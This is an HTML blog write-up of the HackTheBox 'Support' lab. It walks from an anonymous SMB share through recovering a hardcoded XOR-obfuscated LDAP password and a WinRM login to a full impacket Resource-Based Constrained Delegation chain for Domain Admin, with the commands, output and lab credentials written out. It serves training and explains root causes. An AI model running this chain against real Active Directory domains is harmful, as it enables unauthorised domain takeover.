@@ -1,0 +1,695 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta http-equiv="Content-Security-Policy" content="default-src 'self'; base-uri 'self'; form-action 'self'; object-src 'none'; script-src 'self' https://static.cloudflareinsights.com; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src 'self' https://fonts.gstatic.com; img-src 'self' data:; connect-src 'self' https://cloudflareinsights.com; worker-src 'self' blob:;">
+<meta name="referrer" content="strict-origin-when-cross-origin">
+<style>.writeup-back-link:hover{transform:translateX(-2px);background:rgba(26,26,24,1)!important;}</style>
+<title>HTB: Support — S. Markakis</title>
+<meta name="description" content="HackTheBox Support — an easy Active Directory box rooted entirely from macOS: a leaked .NET tool on an anonymous SMB share decompiles to a hardcoded, XOR-obfuscated LDAP password; that account's directory read finds another password stashed in the support user's info attribute for a WinRM foothold; and a GenericAll over the DC object drives a Resource-Based Constrained Delegation chain to Domain Admin — done with ilspycmd, ldapsearch and pure-Python impacket, no Windows attack host.">
+<meta property="og:title" content="HTB: Support — S. Markakis">
+<meta property="og:description" content="HackTheBox Support — rooting an easy AD box from macOS: leaked .NET tool → XOR-decrypt a hardcoded LDAP password → a password in the info attribute → WinRM → RBCD to Domain Admin, all with ilspycmd, ldapsearch and impacket.">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://s-markakis.github.io/writeups/htb-support.html">
+<meta property="og:image" content="https://s-markakis.github.io/writeups/assets/og/htb-support.png">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://s-markakis.github.io/writeups/assets/og/htb-support.png">
+<link rel="canonical" href="https://s-markakis.github.io/writeups/htb-support.html">
+
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Barlow+Condensed:wght@700;800&family=Barlow:wght@400;500;600&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="../style.css">
+<style>
+  :root {
+    --bg:        #eae8e3;
+    --bg-code:   #dddbd5;
+    --bg-term:   #d4d2cc;
+    --text:      #888880;
+    --text-dark: #1a1a18;
+    --text-mid:  #555550;
+    --border:    #c8c6c0;
+    --tag-bg:    #d8d6d0;
+    --tag-text:  #555550;
+    --accent:    #1a1a18;
+    --t-user:    #4a7c59;
+    --t-host:    #5a6e8a;
+    --t-path:    #7a6040;
+    --t-cmd:     #1a1a18;
+    --t-out:     #666660;
+    --t-yellow:  #8a7030;
+    --t-red:     #8a3030;
+    --t-green:   #3a6a48;
+    --t-comment: #aaa89f;
+    --t-blue:    #3a5a7a;
+  }
+
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+  html { scroll-behavior: smooth; }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: 'Barlow', sans-serif;
+    font-size: 17px;
+    line-height: 1.75;
+    -webkit-font-smoothing: antialiased;
+  }
+
+  .wrapper {
+    position: relative;
+    z-index: 1;
+    width: 100%;
+    max-width: 780px;
+    margin: 0 auto;
+    padding: 4rem 2rem 8rem;
+  }
+
+  .post-header { margin-bottom: 2.5rem; }
+
+  h1 {
+    font-family: 'Barlow Condensed', sans-serif;
+    font-weight: 800;
+    font-size: 3.2rem;
+    line-height: 1.05;
+    color: var(--text-dark);
+    letter-spacing: -.01em;
+    margin-bottom: 1rem;
+  }
+
+  .post-meta {
+    display: flex;
+    align-items: center;
+    gap: 1rem;
+    font-size: 0.85rem;
+    color: var(--text);
+    flex-wrap: wrap;
+  }
+  .post-meta .date { color: var(--text); }
+
+  .tag {
+    background: var(--tag-bg);
+    color: var(--tag-text);
+    font-size: 0.72rem;
+    font-weight: 600;
+    letter-spacing: .08em;
+    text-transform: uppercase;
+    padding: .2rem .6rem;
+    border-radius: 3px;
+  }
+  .tag-htb  { background: #c8d8c0; color: #2a4a28; }
+  .tag-lin  { background: #d8d0c0; color: #4a3a20; }
+  .tag-win  { background: #c0d0e0; color: #1e3a5a; }
+
+  .divider {
+    border: none;
+    border-top: 1px solid var(--border);
+    margin: 2rem 0;
+  }
+
+  .overview {
+    background: var(--bg-code);
+    border-left: 3px solid var(--text-dark);
+    padding: 1.2rem 1.5rem;
+    margin: 2rem 0;
+    font-size: 0.95rem;
+    line-height: 1.7;
+    color: var(--text-mid);
+  }
+
+  .chain {
+    display: flex;
+    flex-wrap: wrap;
+    align-items: center;
+    gap: .4rem;
+    background: var(--bg-code);
+    border: 1px solid var(--border);
+    padding: .9rem 1.2rem;
+    border-radius: 4px;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.74rem;
+    margin: 1.5rem 0 2.5rem;
+    color: var(--text-mid);
+  }
+  .chain-node {
+    background: var(--bg);
+    border: 1px solid var(--border);
+    color: var(--text-dark);
+    padding: .2rem .7rem;
+    border-radius: 3px;
+    font-weight: 500;
+  }
+  .chain-arrow { color: var(--text); }
+
+  h2 {
+    font-family: 'Barlow Condensed', sans-serif;
+    font-weight: 800;
+    font-size: 1.9rem;
+    color: var(--text-dark);
+    margin: 3rem 0 .8rem;
+    letter-spacing: -.01em;
+  }
+
+  h3 {
+    font-family: 'Barlow', sans-serif;
+    font-weight: 600;
+    font-size: 1.1rem;
+    color: var(--text-dark);
+    margin: 2rem 0 .6rem;
+  }
+
+  p { color: var(--text); margin-bottom: 1rem; }
+
+  strong { color: var(--text-dark); font-weight: 600; }
+
+  a { color: var(--text-mid); }
+
+  code {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.82em;
+    background: var(--bg-code);
+    border: 1px solid var(--border);
+    color: var(--text-mid);
+    padding: .1em .4em;
+    border-radius: 3px;
+  }
+
+  .terminal {
+    background: var(--bg-term);
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    margin: 1.4rem 0;
+    overflow: hidden;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.8rem;
+    line-height: 1.65;
+  }
+  .term-bar {
+    background: var(--bg-code);
+    border-bottom: 1px solid var(--border);
+    padding: .45rem 1rem;
+    display: flex;
+    align-items: center;
+    gap: .4rem;
+  }
+  .dot { width: 11px; height: 11px; border-radius: 50%; }
+  .dr { background: #c07070; }
+  .dy { background: #b8a050; }
+  .dg { background: #60a070; }
+  .term-label {
+    margin-left: auto;
+    font-size: 0.7rem;
+    color: var(--text);
+    letter-spacing: .05em;
+  }
+  .term-body {
+    padding: 1rem 1.3rem;
+    overflow-x: auto;
+    white-space: pre;
+  }
+
+  .pu  { color: var(--t-user);    font-weight: 700; }
+  .ph  { color: var(--t-host);    font-weight: 700; }
+  .pp  { color: var(--t-path); }
+  .ps  { color: var(--t-comment); }
+  .pd  { color: var(--text-mid); }
+  .pc  { color: var(--t-cmd);     font-weight: 500; }
+  .po  { color: var(--t-out); }
+  .py  { color: var(--t-yellow); }
+  .pr  { color: var(--t-red); }
+  .pg  { color: var(--t-green); }
+  .pb  { color: var(--t-blue); }
+  .pco { color: var(--t-comment); }
+
+  .alert {
+    padding: .9rem 1.2rem;
+    margin: 1.4rem 0;
+    border-left: 3px solid;
+    font-size: 0.92rem;
+    border-radius: 0 4px 4px 0;
+  }
+  .alert-info    { background: #d8dde8; border-color: var(--t-blue);  color: #2a3a5a; }
+  .alert-warn    { background: #e8e0c8; border-color: var(--t-yellow); color: #5a4010; }
+  .alert-success { background: #d0ddd0; border-color: var(--t-green); color: #1a3a20; }
+
+  table {
+    width: 100%;
+    border-collapse: collapse;
+    margin: 1.4rem 0;
+    font-size: 0.88rem;
+  }
+  th {
+    text-align: left;
+    padding: .55rem 1rem;
+    font-family: 'Barlow Condensed', sans-serif;
+    font-weight: 700;
+    font-size: 0.8rem;
+    letter-spacing: .08em;
+    text-transform: uppercase;
+    color: var(--text-mid);
+    border-bottom: 2px solid var(--border);
+    background: var(--bg-code);
+  }
+  td {
+    padding: .5rem 1rem;
+    border-bottom: 1px solid var(--border);
+    color: var(--text);
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.78rem;
+  }
+  tr:hover td { background: var(--bg-code); }
+
+  ul, ol { padding-left: 1.5rem; margin-bottom: 1rem; }
+  li { color: var(--text); margin-bottom: .3rem; }
+
+  .st td:nth-child(1) { color: var(--text-dark); font-weight: 600; }
+  .st td:nth-child(2) { color: var(--text-mid); }
+
+  footer {
+    border-top: 1px solid var(--border);
+    padding: 2rem 3rem;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    font-size: 0.82rem;
+    color: var(--text);
+  }
+  footer a { color: var(--text-mid); text-decoration: none; }
+  footer a:hover { color: var(--text-dark); }
+
+  .back {
+    display: inline-flex;
+    align-items: center;
+    gap: .4rem;
+    font-size: 0.85rem;
+    color: var(--text);
+    text-decoration: none;
+    margin-bottom: 2.5rem;
+    transition: color .15s;
+  }
+  .back:hover { color: var(--text-dark); }
+
+  .screenshot {
+    max-width: 100%;
+    height: auto;
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    margin: 1.6rem auto;
+    display: block;
+  }
+  picture { display: block; }
+
+  @media (max-width: 600px) {
+    nav { padding: 1rem 1.2rem; }
+    .wrapper { padding: 2rem 1.2rem 5rem; }
+    h1 { font-size: 2.4rem; }
+  }
+</style>
+<script src="../js/theme.js"></script>
+<style>
+  body.dark {
+    --bg:#0f0f0f; --bg-code:#161616; --bg-term:#161616; --border:#2a2a2a;
+    --text:#959086; --text-dark:#f4f3ef; --text-mid:#d4d2cc;
+    --tag-bg:#1e1e1e; --tag-text:#999690; --accent:#f4f3ef;
+    --t-user:#6a9c79; --t-host:#7a8eaa; --t-path:#9a8060; --t-cmd:#f4f3ef;
+    --t-out:#a6a69c; --t-yellow:#aa9050; --t-red:#aa5050; --t-green:#5a8a68;
+    --t-comment:#7a7870; --t-blue:#5a7a9a;
+  }
+</style>
+<style>
+  .htb-cta{display:flex;gap:.6rem;flex-wrap:wrap;margin:1.5rem 0}
+  .htb-cta.top{margin-top:.4rem}
+  .htb-cta a{flex:1 1 220px;display:flex;align-items:center;gap:.75rem;padding:.75rem .9rem;background:var(--bg-code);border:1px solid var(--border);border-radius:8px;text-decoration:none;color:var(--text-dark);font-family:'Barlow',sans-serif;transition:transform .15s,border-color .15s,background .15s}
+  .htb-cta a:hover{transform:translateY(-2px);border-color:var(--text-dark);background:var(--bg-term)}
+  .htb-cta svg{width:20px;height:20px;flex:none;stroke:var(--text-dark);fill:none;stroke-width:2;stroke-linecap:round;stroke-linejoin:round}
+  .htb-cta .l-t{display:block;font-family:'Barlow Condensed',sans-serif;font-weight:600;font-size:1.02rem;letter-spacing:.01em;line-height:1.15;color:var(--text-dark)}
+  .htb-cta .l-s{display:block;font-size:.72rem;color:var(--text-mid);line-height:1.25}
+  .htb-cta .l-x{margin-left:auto;color:var(--text-mid);font-size:.95rem}
+</style>
+<script id="sp1r4-jsonld" type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "HTB: Support",
+  "description": "HackTheBox Support — an easy Active Directory box rooted entirely from macOS: a leaked .NET tool on an anonymous SMB share decompiles to a hardcoded, XOR-obfuscated LDAP password; that account's directory read finds another password stashed in the support user's info attribute for a WinRM foothold; and a GenericAll over the DC object drives a Resource-Based Constrained Delegation chain to Domain Admin — done with ilspycmd, ldapsearch and pure-Python impacket, no Windows attack host.",
+  "datePublished": "2026-09-12",
+  "dateModified": "2026-09-12",
+  "author": {
+    "@type": "Person",
+    "name": "S. Markakis",
+    "url": "https://s-markakis.github.io/"
+  },
+  "publisher": {
+    "@type": "Person",
+    "name": "S. Markakis",
+    "url": "https://s-markakis.github.io/"
+  },
+  "url": "https://s-markakis.github.io/writeups/htb-support.html",
+  "image": "https://s-markakis.github.io/writeups/assets/og/htb-support.png",
+  "keywords": [
+    "offensive",
+    "htb"
+  ],
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://s-markakis.github.io/blog.html#htb-support"
+  },
+  "timeRequired": "PT9M"
+}
+</script>
+</head>
+<body class="has-nav">
+<nav id="site-nav"></nav>
+<a href="../blog.html" class="writeup-back-link" style="position:fixed;top:66px;left:18px;z-index:51;display:inline-flex;align-items:center;gap:8px;padding:8px 14px;background:rgba(26,26,24,0.92);color:#eae8e3;font-family:'Barlow',sans-serif;font-size:12px;font-weight:500;letter-spacing:0.04em;text-decoration:none;border-radius:4px;border:0.5px solid rgba(234,232,227,0.15);backdrop-filter:blur(8px);transition:transform 0.18s,background 0.18s;"><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="19" y1="12" x2="5" y2="12"/><polyline points="12 19 5 12 12 5"/></svg>Back to blog</a>
+
+<div class="wrapper">
+
+  <a class="back" href="https://s-markakis.github.io/blog.html">← Back to posts</a>
+
+  <div class="post-header">
+    <h1>HTB: Support</h1>
+    <div class="post-meta">
+      <span class="date">September 12, 2026</span>
+      <span class="tag tag-htb">HackTheBox</span>
+      <span class="tag tag-win">Windows</span>
+      <span class="tag">Active Directory</span>
+      <span>&nbsp;9 min read</span>
+    </div>
+  </div>
+
+  <div class="htb-cta top">
+  <a href="https://app.hackthebox.com/users/332355" target="_blank" rel="noopener">
+    <svg viewBox="0 0 24 24"><polygon points="12 2 22 8.5 22 15.5 12 22 2 15.5 2 8.5"/><line x1="12" y1="22" x2="12" y2="15.5"/><polyline points="22 8.5 12 15.5 2 8.5"/></svg>
+    <span><span class="l-t">HackTheBox</span><span class="l-s">My HTB profile &amp; more boxes</span></span>
+    <span class="l-x">↗</span>
+  </a>
+  <a href="https://github.com/s-markakis" target="_blank" rel="noopener">
+    <svg viewBox="0 0 24 24"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"/></svg>
+    <span><span class="l-t">GitHub</span><span class="l-s">Open-source security &amp; automation tools</span></span>
+    <span class="l-x">↗</span>
+  </a>
+</div>
+
+  <hr class="divider">
+
+  <div class="overview">
+    Support is an easy Active Directory box, and most walkthroughs assume a Windows attack host — dnSpy, PowerView, Rubeus, <code>Enter-PSSession</code> over CredSSP. I did the whole thing from an Apple-silicon Mac. The path is a clean four-hop credential chain: an <strong>anonymous SMB share</strong> hands over a custom <code>UserInfo.exe</code>; decompiling it reveals a <strong>hardcoded LDAP password</strong> hidden behind a trivial XOR routine; that read-only LDAP account finds <em>another</em> password sitting in the <code>support</code> user's <strong><code>info</code> attribute</strong>, which is a member of Remote Management Users for a WinRM foothold; and finally <code>support</code>'s membership of a group with <strong>GenericAll over the domain controller</strong> drives a <strong>Resource-Based Constrained Delegation</strong> chain to Domain Admin. Every step ran on macOS/Linux tooling — <code>ilspycmd</code>, <code>ldapsearch</code>, <code>evil-winrm</code> and pure-Python impacket.
+  </div>
+
+  <div class="chain">
+    <span class="chain-node">SMB anon share</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">decompile UserInfo.exe</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">ldap (LDAP read)</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">info attribute → support</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">WinRM (user)</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">RBCD → DA</span>
+  </div>
+
+  <!-- ══ RECON ══ -->
+  <h2>Reconnaissance</h2>
+
+  <p>A full TCP scan is a textbook domain controller — DNS, Kerberos, LDAP, the global catalog, SMB, WinRM and ADWS. Domain <code>support.htb</code>, hostname <code>DC</code>, Windows Server 2022. Worth noting early: the Kerberos server time on port 88 matched my host clock, so none of the <code>faketime</code> skew-wrangling that some AD boxes need would be required here.</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">nmap -p-</span>
+    </div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">nmap -Pn -sC -sV -p- --min-rate 2000 -oA scans/full &lt;IP&gt;</span>
+<span class="po">53/tcp   open  domain        Simple DNS Plus
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
+139/tcp  open  netbios-ssn
+389/tcp  open  ldap          AD LDAP (Domain: support.htb, Site: Default-First-Site-Name)
+445/tcp  open  microsoft-ds
+464/tcp  open  kpasswd5
+593/tcp  open  ncacn_http
+636/tcp  open  ldaps
+3268/tcp open  ldap          Global Catalog
+5985/tcp open  http          WinRM (Microsoft HTTPAPI httpd 2.0)
+9389/tcp open  mc-nmf        .NET Message Framing (ADWS)</span></div>
+  </div>
+
+  <p>Add the DC to <code>/etc/hosts</code> up front — Kerberos resolves service principals by hostname, and the RBCD step at the end authenticates against <code>dc.support.htb</code>, not an IP:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">/etc/hosts</span>
+    </div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">echo '&lt;IP&gt; dc.support.htb support.htb dc DC' | sudo tee -a /etc/hosts</span></div>
+  </div>
+
+  <!-- ══ SMB ══ -->
+  <h2>SMB — an anonymous share and a leaked tool</h2>
+
+  <p>A null session authenticates but can't list shares. A <strong>guest</strong> login — any username, blank password — can, and that distinction matters: null and guest are different auth paths, and boxes often block one while leaving the other open.</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">nxc smb --shares (guest)</span>
+    </div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">nxc smb &lt;IP&gt; -u anon -p '' --shares</span>
+<span class="po">SHARE           PERMISSIONS   REMARK
+IPC$            READ          Remote IPC
+NETLOGON                      Logon server share</span>
+<span class="pg">support-tools   READ          support staff tools</span><span class="po">
+SYSVOL                        Logon server share</span></div>
+  </div>
+
+  <p><code>support-tools</code> is readable. Most of its contents are off-the-shelf portable apps (7-Zip, Notepad++, PuTTY, Sysinternals, Wireshark) — but one file doesn't belong: a custom <code>UserInfo.exe.zip</code>. In-house tooling shipped to an open share is exactly where hardcoded credentials live.</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">grab &amp; unzip</span>
+    </div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">smbclient //&lt;IP&gt;/support-tools -U 'anon%' -c 'get UserInfo.exe.zip'</span>
+<span class="pd">$ </span><span class="pc">unzip UserInfo.exe.zip -d UserInfo &amp;&amp; file UserInfo/UserInfo.exe</span>
+<span class="po">UserInfo.exe: PE32 executable ... Mono/.Net assembly, for MS Windows</span></div>
+  </div>
+
+  <!-- ══ RE ══ -->
+  <h2>Decompiling .NET on macOS (no dnSpy)</h2>
+
+  <p>dnSpy is Windows-only, but a .NET assembly decompiles cleanly on macOS with the cross-platform <strong>ILSpy</strong> command-line tool. It installs as a <code>dotnet</code> global tool. One gotcha on a Homebrew <code>dotnet</code>: <code>ilspycmd</code> can't find the runtime unless <code>DOTNET_ROOT</code> points at the <code>libexec</code> directory (not <code>bin</code>).</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">ilspycmd</span>
+    </div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">dotnet tool install -g ilspycmd</span>
+<span class="pd">$ </span><span class="pc">export DOTNET_ROOT=/opt/homebrew/Cellar/dotnet/&lt;ver&gt;/libexec</span>
+<span class="pd">$ </span><span class="pc">ilspycmd UserInfo/UserInfo.exe &gt; UserInfo.decomp.cs</span></div>
+  </div>
+
+  <p>Grepping the decompiled source lights up immediately. There's a hardcoded username, a base64 "encrypted" password, and a <code>getPassword()</code> that "decrypts" it:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">UserInfo.decomp.cs</span>
+    </div>
+    <div class="term-body"><span class="pb">private static string</span><span class="po"> enc_password = </span><span class="pg">"0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E"</span><span class="po">;
+</span><span class="pb">private static byte[]</span><span class="po"> key = Encoding.ASCII.GetBytes(</span><span class="pg">"armando"</span><span class="po">);
+
+</span><span class="pb">public static string</span><span class="po"> getPassword() {
+    byte[] array  = Convert.FromBase64String(enc_password);
+    byte[] array2 = array;
+    </span><span class="pb">for</span><span class="po"> (int i = 0; i &lt; array.Length; i++)
+        array2[i] = (byte)(array[i] ^ key[i % key.Length] ^ </span><span class="py">0xDF</span><span class="po">);
+    ...
+}
+</span><span class="pco">// entry = new DirectoryEntry("LDAP://support.htb", "support\\ldap", password);</span></div>
+  </div>
+
+  <p>The "encryption" is base64 then a byte-wise XOR against the repeating key <code>armando</code>, XORed again with the constant <code>0xDF</code>. XOR is symmetric, so "decrypting" is just running the same routine the code already handed us. Three lines of Python recover the password:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">decrypt.py</span>
+    </div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">python3 -c '
+import base64
+d = base64.b64decode("0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E")
+k = b"armando"
+print(bytes(d[i]^k[i%len(k)]^0xDF for i in range(len(d))).decode())'</span>
+<span class="pg">nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz</span></div>
+  </div>
+
+  <p>So we have <code>support\ldap</code> and its cleartext password — a low-privilege account, but enough to read the directory.</p>
+
+  <!-- ══ LDAP ══ -->
+  <h2>LDAP — a password hiding in an attribute</h2>
+
+  <p>The binary was making LDAP user queries, so the natural next move is to enumerate user objects and look for something in a rarely-inspected field. The <code>info</code> attribute (the "Notes" box in ADUC) is a classic dumping ground for admins who think it's obscure. Filtering for the <code>support</code> account pays off immediately:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">ldapsearch — support account</span>
+    </div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">ldapsearch -x -H ldap://&lt;IP&gt; -D 'support\ldap' -w '&lt;ldap-pw&gt;' \
+     -b 'DC=support,DC=htb' '(sAMAccountName=support)' info memberOf</span>
+<span class="pg">info: Ironside47pleasure40Watchful</span><span class="po">
+memberOf: CN=Shared Support Accounts,CN=Users,DC=support,DC=htb
+memberOf: CN=Remote Management Users,CN=Builtin,DC=support,DC=htb
+sAMAccountName: support</span></div>
+  </div>
+
+  <p>Two gifts in one query: a candidate password for the <code>support</code> account, and confirmation that <code>support</code> is in <strong>Remote Management Users</strong> (WinRM access) <em>and</em> <strong>Shared Support Accounts</strong> — the group we'll abuse for privesc.</p>
+
+  <!-- ══ FOOTHOLD ══ -->
+  <h2>Foothold — WinRM as support</h2>
+
+  <p>The <code>info</code> value is a valid credential, and Remote Management Users means it works over WinRM:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">WinRM foothold + user.txt</span>
+    </div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">nxc winrm &lt;IP&gt; -u support -p 'Ironside47pleasure40Watchful'</span>
+<span class="pg">WINRM  &lt;IP&gt;  5985  DC  [+] support.htb\support:Ironside47pleasure40Watchful (Pwn3d!)</span>
+<span class="pd">$ </span><span class="pc">evil-winrm -i dc.support.htb -u support -p 'Ironside47pleasure40Watchful'</span>
+<span class="pd">*Evil-WinRM* PS&gt; </span><span class="pc">type ..\Desktop\user.txt</span>
+<span class="pg">[redacted — user flag]</span></div>
+  </div>
+
+  <!-- ══ RBCD ══ -->
+  <h2>Privesc — Resource-Based Constrained Delegation</h2>
+
+  <p>BloodHound (or just reading the group's ACL) shows that <strong>Shared Support Accounts</strong> — which <code>support</code> belongs to — has <code>GenericAll</code> over the domain controller's computer object, <code>DC$</code>. That write primitive is the whole ballgame: if I can set <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> on <code>DC$</code> to a principal I control, I can use S4U to impersonate <em>any</em> user — including a Domain Admin — to services on the DC. This is <strong>RBCD</strong>, and it runs end-to-end from Linux/macOS with impacket.</p>
+
+  <p>First confirm the machine-account quota allows creating a computer (default 10), then create one to be the delegate-from principal:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">1 — add a controllable computer account</span>
+    </div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">nxc ldap &lt;IP&gt; -u ldap -p '&lt;ldap-pw&gt;' -M maq</span>
+<span class="po">MAQ  MachineAccountQuota: 10</span>
+<span class="pd">$ </span><span class="pc">addcomputer.py support.htb/support:'Ironside47pleasure40Watchful' \
+     -computer-name 'ATTACK$' -computer-pass 'Password123!' -dc-ip &lt;IP&gt;</span>
+<span class="pg">[*] Successfully added machine account ATTACK$ with password Password123!.</span></div>
+  </div>
+
+  <p>Write the RBCD attribute on <code>DC$</code> so it trusts <code>ATTACK$</code> to act on behalf of others:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">2 — set RBCD on DC$</span>
+    </div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">rbcd.py -delegate-from 'ATTACK$' -delegate-to 'DC$' -action write \
+     support.htb/support:'Ironside47pleasure40Watchful' -dc-ip &lt;IP&gt;</span>
+<span class="pg">[*] Delegation rights modified successfully!
+[*] ATTACK$ can now impersonate users on DC$ via S4U2Proxy</span></div>
+  </div>
+
+  <p>Now S4U2Self+S4U2Proxy as <code>ATTACK$</code> to mint a <code>cifs/dc.support.htb</code> service ticket <em>as the Administrator</em>:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">3 — S4U → administrator ticket</span>
+    </div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">getST.py -spn 'cifs/dc.support.htb' -impersonate administrator -dc-ip &lt;IP&gt; \
+     'support.htb/ATTACK$:Password123!'</span>
+<span class="pg">[*] Saving ticket in administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache</span></div>
+  </div>
+
+  <p>Point <code>KRB5CCNAME</code> at the ccache and execute as SYSTEM. This is where the <code>/etc/hosts</code> entry earns its keep — Kerberos authenticates against the SPN hostname, so the target must be <code>dc.support.htb</code>, never an IP:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">4 — root.txt</span>
+    </div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">export KRB5CCNAME=administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache</span>
+<span class="pd">$ </span><span class="pc">wmiexec.py -k -no-pass dc.support.htb 'type C:\Users\Administrator\Desktop\root.txt'</span>
+<span class="pg">[redacted — root flag]</span></div>
+  </div>
+
+  <div class="alert alert-warn">macOS aside: <code>psexec.py</code>'s interactive command pipe broke under Python 3.14 (<code>STATUS_PIPE_BROKEN</code>) even though the SYSTEM service launched fine. <code>wmiexec.py</code> passes a single command cleanly and was the more reliable one-shot for reading the flag. And clean up after yourself on a real engagement: the <code>ATTACK$</code> account and the RBCD attribute on <code>DC$</code> both persist in the domain (<code>rbcd.py -action flush</code>, then delete the computer object).</div>
+
+  <!-- ══ WRAP ══ -->
+  <h2>Why it worked</h2>
+
+  <table class="st">
+    <tr><th>Stage</th><th>Root cause</th></tr>
+    <tr><td>→ support-tools</td><td>Anonymous/guest SMB read on a share holding in-house tooling (CWE-284 — improper access control)</td></tr>
+    <tr><td>→ ldap creds</td><td>Hardcoded credential obfuscated with a reversible XOR + a key shipped alongside it — obfuscation, not encryption (CWE-798 / CWE-312)</td></tr>
+    <tr><td>→ support (WinRM)</td><td>Cleartext password stored in the account's <code>info</code> attribute, readable by any authenticated principal (CWE-522)</td></tr>
+    <tr><td>→ Domain Admin</td><td>A support group holds <code>GenericAll</code> over the DC object → write <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> → RBCD (CWE-266 — over-privileged ACL)</td></tr>
+  </table>
+
+  <h2>Operator notes — from macOS</h2>
+
+  <ul>
+    <li><strong>No Windows attack host needed.</strong> <code>ilspycmd</code> replaces dnSpy for .NET decompilation, and the entire RBCD chain (<code>addcomputer.py</code> → <code>rbcd.py</code> → <code>getST.py</code> → <code>wmiexec.py</code>) reproduces the PowerView/Powermad/Rubeus workflow in pure-Python impacket — which also sidesteps the CredSSP dance a non-domain-joined Windows box needs for WinRM.</li>
+    <li><strong>Guest ≠ null.</strong> The null session was blocked from listing shares; a guest login with any username and a blank password wasn't. Always try both.</li>
+    <li><strong>Watch the clock, but don't fear it.</strong> The DC time matched the host, so no <code>faketime</code> wrapper was needed here; if it hadn't, <code>bloodyAD</code> auto-corrects skew and NTLM (<code>-H</code>) sidesteps Kerberos entirely.</li>
